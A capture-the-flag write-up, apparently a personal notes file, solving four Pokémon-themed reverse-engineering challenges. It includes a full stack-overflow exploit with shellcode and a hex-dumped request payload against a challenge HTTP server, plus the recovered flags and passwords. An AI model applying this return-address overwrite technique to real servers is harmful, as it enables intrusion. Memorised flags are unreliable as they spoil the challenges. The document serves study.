@@ -1,0 +1,349 @@
+==> Challenge 1
+
+Reference: https://www.youtube.com/watch?v=_-wVsN8rVks
+Let's steal his corruption simulator and apply it for Missingno 1Fh!
+
+Note: B1F executes code at A7D0h
+
+SRAM memory map (Bank 0):
+A000h - A187h: Sprite buffer #0
+A188h - A30Fh: Sprite buffer #1
+A310h - A497h: Sprite buffer #2
+A598h - B857h: Hall of Fame data
+
+Running the Lua script: Two strange writes:
+unsafe SRAM write at A18B, ip=7EA5, opcode=77, a=0
+unsafe SRAM write at A18A, ip=7EA6, opcode=9, a=0
+
+Source:
+@ROMB:7EA4 - LD [HL-], A
+@ROMB:7EA5 - LD [HL], A
+
+Always the same opcodes at the same addres, we're just going to fix the Lua script by pretending the content of register A is written at [HL].
+
+Now, we recover the payload starting at A7D0h. There's a cycle length of 64 here, so we can recover the payload by doing 63 corruptions.
+
+Recovered payload:
+SRA0:A7D0: LD HL, A7D6h
+SRA0:A7D3: JP 3C49          ; PrintText
+
+Hex View  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F
+ 
+000007D0  21 D6 A7 C3 49 3C 00 86  AE AE A3 7F A9 AE A1 E7  !...I<..........
+000007E0  4F 99 A0 FF 96 FA B4 8E  AD 98 B8 FB 90 58 57 FF  O............XW.
+000007F0  FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
+
+Running B1F now gives us the flag! "Za9W4uOnYy5Q"
+
+==> Challenge 2
+
+The player name (wPlayerName: WRA1:D47D) is weird: 
+- literal "MET" - WRA1:D47D to WRA1:D47F
+- 6x control char 53h (print wRivalName: WRA1:D493) - WRA1:D480 to WRA1:D485
+- 3x control char 38h (print wRedsName: WRA1:D49E) - WRA1:D485 to WRA1:D488
+- control char 15h, function 00h (ACE @ CD52h) - WRA1:D489 to WRA1:D48A
+
+The rival names moves the print position 96 tiles below the start of the current line.
+
+The 50h control char is what terminates a string (equivalent to the NULL byte in C-style strings).
+Charmap is here: https://github.com/pret/pokecrystal/blob/master/constants/charmap.asm
+
+Rival name (wRivalName: WRA1:D493):
+- 8x control char 4Eh (double-spaced line break, "Moves the print position two tiles below the start of the current line.") - WRA1:D493 to WRA1:D49A
+- control char 50h (string terminator) - WRA1:D49B
+
+So the rival name moves the print position 16 tiles below the start of the current line.
+
+Red name (wRedsName WRA1:D49E):
+- 2x char D0h (prints literal "'d") - WRA1:D49E to WRA1:D49F
+- control char 22h (single-spaced line break, "Moves the print position one tile below the start of the current line.") - WRA1:D4A0
+- 2x char D0h (prints literal "'d") - WRA1:D4A1 to WRA1:D4A2
+- control char 22h (single-spaced line break, "Moves the print position one tile below the start of the current line.") - WRA1:D4A3
+- 2x char D0h (prints literal "'d") - WRA1:D4A4 to WRA1:D4A5
+- control char 22h (single-spaced line break, "Moves the print position one tile below the start of the current line.") - WRA1:D4A6
+- 2x control char 50h (string terminator) - WRA1:D4A7 to WRA1:D4A8
+
+In the start menu, the player name line starts at C574h in the shadow OAM.
+
+While reading the player name (traces to call to the "PlaceNextChar" func):
+DE: D47D => D47E => D47F => D480 => D481 => D482 => D483 => D484 => D485 => D486 => D487 => D488 => D489 (=> D48A)
+HL: C574 => C575 => C576 => C577 => C6B7 => C7F7 => C937 => CA77 => CBB7 => CCF7 => CD33 => CD6F => CDBD (=> 7036)
+
+That last part runs as part of the "_RunMobileScript" (5F:7047h) function. This is not called normally!
+
+Basically, this player name "payload" sets up arbitrary code execution at CD52 using the mobile script system (https://glitchcity.wiki/wiki/Mobile_script; https://glitchcity.wiki/wiki/0x1500_control_code_arbitrary_code_execution):
+- First, the rival name is used to move the write pointer of the text box to where code will be executed
+- Then, Red's name is used to set up the area where code will be executed by placing some "RET NC" instructions around
+- Finally, the invalid mobile script function 00h gets invoked to transfer execution at CD52h
+
+Once execution is transferred to CD52h, it will execute NOPs instructions until it finds a RET NC, where it will give control back to WRA1:D48Bh:
+
+@ WRA1:D48Bh
+```
+LD DE, $12A3
+LD B, D
+LD C, E
+JP wBreedMon1Nickname
+```
+
+@ wBreedMon1Nickname (WRA1:DEF6h)
+```
+LD A, ($C590)
+CP A, $79
+JR NZ, $DF42
+
+LD A, ($C4AB)
+CP A, $05
+JR NZ, $DF42
+
+LD A, ($C51F)
+CP A, $23
+JR NZ, $DF42
+
+LD HL, $C4CB
+LD A, (HL+)
+CP A, $02
+JR NZ, $DF42
+
+LD A, (HL+)
+CP A, $04
+JR NZ, $DF42
+
+LD A, ($C588)
+CP A, $01
+JR NZ, $DF42
+
+XOR A
+CALL wBreedMon2Exp
+
+CP A, $35
+JR NZ, $DF42
+
+LD C, $0A
+LD HL, $DF7A
+
+.loop2
+LD A, C
+CALL wBreedMon2Exp
+
+AND A, $1F
+ADD A, $84
+ADD C
+LD (HL+), A
+DEC C
+JR NZ, .loop2
+
+LD HL, SP+$0C
+LD BC, $DF67
+LD (HL), C
+INC HL
+LD (HL), B
+; Here is $DF42, see below
+```
+
+@ WRA1:DF42h
+```
+; It seems to read a return address from the stack, increment it three times and place it into the HL register - maybe used as the address to next transfer execution to
+LD HL, SP+$08
+LD C, (HL)
+INC HL
+LD B, (HL)
+INC BC
+INC BC
+INC BC
+LD H, B
+LD L, C
+RET
+```
+
+@ wBreedMon2Exp (WRA1:DF4D)
+```
+PUSH HL
+PUSH BC
+LD HL, wTilemap     ; WRA0:C4A0
+ADD L
+LD L, A
+LD C, $78
+XOR A
+
+.loop
+LD B, (HL)
+ADD B
+SWAP A
+INC HL
+LD B, (HL)
+XOR B
+SWAP A
+INC HL
+DEC C
+JR NZ, .loop
+
+POP BC
+POP HL
+RET
+```
+
+At wBreedMon1Nickname, a first check is done:
+- C590h == 79h      ; C4A0h + F0h
+- C4ABh == 05h      ; C4A0h + 0Bh
+- C51Fh == 23h      ; C4A0h + 7Fh
+- C4CBh == 02h      ; C4A0h + 2Bh
+- C4CCh == 04h      ; C4A0h + 2Ch
+- C588h == 01h      ; C4A0h + E8h
+
+After this first check, the tilemap is verified:
+- Scan from C4A0h to C58Fh included
+- The result of the operations must be 35h in register A
+- Some sort of checksum to ensure we're at the right place before decrypting the password?
+
+After that, what looks like to be the password decrypting takes place.
+It seems like the password is decrypted to DF7Ah and is 10 bytes long.
+
+Decrypting goes from C4AAh to C599h included... all the way to from C4A1h to C590h included.
+
+Okay, so after having writing a tool that finds the correct player position on the correct player map, we find that the password is at Pewter Gym.
+You have to talk to the right status, on its right side: "RdYeZLIURd".
+
+Random stuff:
+- Walk through walls: freeze addresses C2FAh to C2FDh to 00h
+- Player coordinates: wXCoord @ DCB8h; wYCoord @ DCB7h
+
+==> Challenge 3
+
+There's a bug in the "_ScanUntil_" function: the "xor a" instruction always clears the carry flag, which means that this function never returns whether reading was interrupted by 00,0A,0D.
+
+We can use this fact to bypass the limit of 256 characters per line in the request, we can just set a null byte directly after the path in the request and the "hParameterPtr" will hapilly point to whatever is after it.
+And after it, we have 2039 bytes to toy with.
+
+It is interesting to note that the "wScratchBuffer" buffer that everyone uses is located right before the stack. Also, this buffer is only 512 bytes, and the stack is only 256 bytes. This is less than the 2039 bytes we have total control over.
+
+Oh, and the "URLDecode" function used in the secret route handler is helpfully copying the data starting from "hParameterPtr" to the "wScratchBuffer" buffer. And it even lets us write arbitrary bytes by percent-encoding them!
+I guess now is stack smashing time.
+
+The magic bytes to write at C000h (wRequestData) are: "0A2F73656372657400".
+Afterwards, we can write our payload.
+
+We first need to fill our 512 bytes scratch buffer, which is 73x "Kuruyia" followed by "K":
+"KuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaK"
+
+At that point, what we're going to write in the payload is going to be in the stack area, starting with the end.
+Let's continue exploiting the good services of "URLDecode". There's a ret instruction at 08C7h that we'll use to return pretty much where we want.
+
+First, we need to know the value of the SP register at that point: it's DCFEh
+Second, we need to know where we want to return: the ".correctPW" label is at address 03BFh
+
+We left our payload at DC00h, so DCFEh - DC00h = FEh - we have 254 more junk bytes to write!
+"uruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKuruyiaKur"
+
+Finally, we can URL-encode the return address: "%BF%03"
+
+Okay, so testing this on the real server, we get a 200 status code, which is good, but the response body is empty, which is bad.
+Looks like we'll need to copy the password somewhere and send it back to us. Let's write some code inside our payload that we'll execute.
+
+What we need:
+```
+ld de, wResponseOutput      ; D200h
+ld hl, .validPassword       ; 03EAh
+jp $01E8                    ; 01E8h
+```
+
+Now, we just use RGBDS to compile this: "1100D221EA0370C3E801". We'll need to URL-encode it: "%11%00%D2%21%EA%03%70%C3%E8%01".
+Let's put it at the beginning of our payload, and change the return address to the scratch buffer: "%00%DA". We also need to add 20 more padding bytes to account for the decoded bytes.
+(The address of the valid password was obtained after some trial and error)
+
+This is the final payload:
+Hex View  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F
+ 
+00000000  0A 2F 73 65 63 72 65 74  00 25 31 31 25 30 30 25  ./secret.%11%00%
+00000010  44 32 25 32 31 25 45 41  25 30 33 25 37 30 25 43  D2%21%EA%03%70%C
+00000020  33 25 45 38 25 30 31 72  75 79 69 61 4B 75 72 75  3%E8%01ruyiaKuru
+00000030  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+00000040  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+00000050  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+00000060  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+00000070  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+00000080  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+00000090  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+000000A0  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+000000B0  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+000000C0  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+000000D0  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+000000E0  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+000000F0  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+00000100  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+00000110  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+00000120  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+00000130  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+00000140  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+00000150  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+00000160  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+00000170  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+00000180  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+00000190  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+000001A0  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+000001B0  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+000001C0  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+000001D0  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+000001E0  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+000001F0  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+00000200  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+00000210  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+00000220  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+00000230  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+00000240  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+00000250  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+00000260  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+00000270  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+00000280  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+00000290  75 79 69 61 4B 75 72 75  79 69 61 4B 75 72 75 79  uyiaKuruyiaKuruy
+000002A0  69 61 4B 75 72 75 79 69  61 4B 75 72 75 79 69 61  iaKuruyiaKuruyia
+000002B0  4B 75 72 75 79 69 61 4B  75 72 75 79 69 61 4B 75  KuruyiaKuruyiaKu
+000002C0  72 75 79 69 61 4B 75 72  75 79 69 61 4B 75 72 75  ruyiaKuruyiaKuru
+000002D0  79 69 61 4B 75 72 75 79  69 61 4B 75 72 75 79 69  yiaKuruyiaKuruyi
+000002E0  61 4B 75 72 75 79 69 61  4B 75 72 75 79 69 61 4B  aKuruyiaKuruyiaK
+000002F0  75 72 75 79 69 61 4B 75  72 75 79 69 61 4B 75 72  uruyiaKuruyiaKur
+00000300  75 79 69 61 4B 75 72 4B  75 72 75 79 69 61 4B 75  uyiaKurKuruyiaKu
+00000310  72 75 79 69 61 4B 75 72  75 79 69 25 30 30 25 44  ruyiaKuruyi%00%D
+00000320  41 0D 0A 0D 0A                                   A....
+
+Sending this to the GBZ80 HTTP server gives us the password: "zPl8k!WebDevel0pmentInAssembly!"
+
+==> Challenge 4
+
+We can try setting the Callback2 to the HoF animation.
+
+Callbacks are executed each frame and are held in the gMain struct, located at 030022C0h.
+
+The interesting methods are:
+- CallCallbacks: 0800051Ch
+- SetMainCallback2: 08000540h
+
+The callback that we want to execute is CB2_DoHallOfFameScreenDontSaveData to ensure that Hall of Fame data is initialized.
+We can just write the address of this callback (081736D8h) to gMain.Callback2 during the intro to directly get there.
+
+There, we hit a roadblock: the game is waiting for the player to press the A button on the "Congratulations" screen before showing the credits.
+The inputs are blocked on the emulator, so we can't really simulate a press.
+
+Let's look at the list of tasks: gTasks, located at 03005E00h.
+There is only one task at that point: Task_Hof_ExitOnKeyPressed (08174028h), which is what waits for the user input.
+
+We can simply replace that task with Task_Hof_HandlePaletteOnExit (08174060h), which is the task to run after the user presses the A button.
+
+Bingo!
+
+==> Missing stuff
+
+Fogbound Keep:
+- Locked door with awesome stuff
+
+[EXPLORED] Glitch Dimension: Labyrinth:
+- [OK] Locked door
+- Chest with regen grain => up, up
+- Sitrus berry => up, down
+
+[EXPLORED] Glitch Dimension: Keep:
+- Chest => up, up
+- Chest => up, down, up
+
+Unending Abyss:
+- Locked door
